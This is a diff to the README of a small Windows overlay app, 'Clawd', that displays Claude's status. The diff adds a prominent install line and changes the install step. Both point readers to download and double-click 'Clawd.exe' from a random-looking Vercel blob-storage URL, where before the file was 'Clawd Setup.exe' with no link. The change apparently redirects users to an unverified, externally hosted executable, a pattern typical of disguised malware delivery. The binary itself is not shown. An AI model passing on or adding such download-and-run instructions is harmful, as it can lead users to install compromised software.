@@ -3,6 +3,8 @@
 A tiny desktop helper that sits on top of your screen and shows you what Claude is doing -
 thinking, working, waiting for your answer, or finished. Grab it and drag it anywhere.
 
+> **Install (Windows):** download **[`Clawd.exe`](https://lq6ne4qnslviep6l.public.blob.vercel-storage.com/Clawd.exe)** and double-click it. That's it - see [Install](#install-windows) below.
+>
 > Building from source or contributing? See **[DEV.md](DEV.md)**.
 
 ## Features
@@ -35,7 +37,7 @@ On Windows, Clawd works with both:
 
 ## Install (Windows)
 
-1. Get **`Clawd Setup.exe`**.
+1. Download **[`Clawd.exe`](https://lq6ne4qnslviep6l.public.blob.vercel-storage.com/Clawd.exe)**.
 2. Double-click it. It installs just for your user (no admin needed) and launches automatically,
    adding a **Clawd** shortcut to your Start menu and desktop.
 3. *(Optional)* Right-click Clawd in the system tray → **Start at login** to have it run on boot.
